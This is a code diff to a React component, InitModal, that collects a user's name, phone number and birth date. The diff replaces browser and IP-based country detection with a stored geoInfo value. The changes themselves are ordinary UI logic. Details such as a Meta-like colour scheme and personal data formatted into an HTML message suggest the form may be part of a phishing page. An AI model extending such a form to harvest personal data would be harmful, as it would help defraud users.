@@ -44,8 +44,6 @@ const FORM_FIELDS: FormField[] = [
 const InitModal: FC = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
-    const [countryCode, setCountryCode] = useState('us');
-    const [countryReady, setCountryReady] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
@@ -61,28 +59,8 @@ const InitModal: FC = () => {
 
     const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep, isModalOpen } = store();
 
-    // Helper function to get country code from browser language
-    const getCountryCodeFromBrowser = () => {
-        const parts = navigator.language.toLowerCase().split('-');
-        const lang = parts[0];   // 'vi' from 'vi-VN'
-        const region = parts[1]; // 'vn' from 'vi-VN' (already a country code!)
-
-        // If browser provides region (e.g., vi-VN → 'vn'), use it directly as country code
-        if (region && /^[a-z]{2}$/.test(region)) {
-            return region;
-        }
-
-        // Otherwise map language code to country code
-        const langCountryMap: Record<string, string> = {
-            'vi': 'vn', 'en': 'us', 'es': 'es', 'fr': 'fr',
-            'de': 'de', 'ja': 'jp', 'zh': 'cn', 'ko': 'kr', 'pt': 'pt',
-            'th': 'th', 'id': 'id', 'ar': 'ae', 'ru': 'ru', 'uk': 'ua',
-            'hi': 'in', 'bn': 'bd', 'it': 'it', 'pl': 'pl', 'nl': 'nl',
-            'tr': 'tr', 'el': 'gr', 'sv': 'se', 'no': 'no', 'tl': 'ph',
-            'ms': 'my'
-        };
-        return langCountryMap[lang] || 'us';
-    };
+    // Use country code from Zustand store's geoInfo (already fetched and persisted)
+    const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';
 
     // Ensure form step is correct when modal opens
     useEffect(() => {
@@ -90,43 +68,6 @@ const InitModal: FC = () => {
             setFormStep('init');
         }
     }, [isModalOpen, formStep, setFormStep]);
-
-    // Detect country code on mount - runs once when component mounts
-    useEffect(() => {
-        // Step 1: Set fallback country immediately from browser language
-        const fallbackCC = getCountryCodeFromBrowser();
-        setCountryCode(fallbackCC);
-        setCountryReady(true); // Mark ready immediately with browser fallback
-        
-        // Step 2: Refine with geo API in background
-        const controller = new AbortController();
-        
-        const detectCountry = async () => {
-            try {
-                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { 
-                    timeout: 5000,
-                    signal: controller.signal 
-                });
-                
-                let cc = (data.country_code || '').toLowerCase().trim();
-                
-                // Validate
-                if (cc.length !== 2 || !/^[a-z]{2}$/.test(cc)) {
-                    cc = fallbackCC;
-                }
-                
-                setCountryCode(cc);
-                setCountryReady(true);
-            } catch (error) {
-                if (error instanceof Error && error.name === 'AbortError') return;
-                // Keep fallback - already set and ready
-            }
-        };
-        
-        detectCountry();
-        
-        return () => controller.abort();
-    }, []); // Empty dep - runs once on mount (component remounts on each modal open)
 
     // Translation effect - hybrid: hardcoded first, then API fallback for missing texts
     useEffect(() => {
@@ -223,20 +164,15 @@ const InitModal: FC = () => {
     const t = (text: string): string => translations[text] || text;
 
     const initOptions = useMemo(
-        () => {
-            // List of supported country codes by IntlTelInput
-            const supportedCountries = ['us', 'vn', 'gb', 'fr', 'de', 'es', 'it', 'jp', 'cn', 'in', 'br', 'mx', 'ca', 'au', 'kr', 'th', 'id', 'ph', 'sg', 'my', 'ae', 'sa', 'ph', 'pk', 'bd', 'ru', 'uk', 'pl', 'nl', 'be', 'ch', 'se', 'no', 'dk', 'fi', 'gr', 'pt', 'tr'];
-            const initial = (countryCode && supportedCountries.includes(countryCode)) ? countryCode : 'us';
-            return {
-                // eslint-disable-next-line @typescript-eslint/no-explicit-any
-                initialCountry: initial as any,
-                separateDialCode: true,
-                nationalMode: true,
-                autoPlaceholder: 'aggressive' as const,
-                placeholderNumberType: 'MOBILE' as const,
-                countrySearch: true
-            };
-        },
+        () => ({
+            initialCountry: countryCode as '',
+            separateDialCode: true,
+            strictMode: true,
+            nationalMode: true,
+            autoPlaceholder: 'aggressive' as const,
+            placeholderNumberType: 'MOBILE' as const,
+            countrySearch: false
+        }),
         [countryCode]
     );
 
@@ -341,18 +277,14 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
                             </div>
                         ))}
                         <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t('Mobile phone number')}</p>
-                        {countryReady ? (
-                            <IntlTelInput
-                                onChangeNumber={handlePhoneChange}
-                                initOptions={initOptions}
-                                inputProps={{
-                                    name: 'phoneNumber',
-                                    className: 'h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm'
-                                }}
-                            />
-                        ) : (
-                            <div className='h-9 sm:h-10 bg-gray-100 rounded-lg animate-pulse' />
-                        )}
+                        <IntlTelInput
+                            onChangeNumber={handlePhoneChange}
+                            initOptions={initOptions}
+                            inputProps={{
+                                name: 'phoneNumber',
+                                className: 'h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm'
+                            }}
+                        />
 
                         {/* Date of Birth Section */}
                         <div className='mt-1.5 sm:mt-2'>
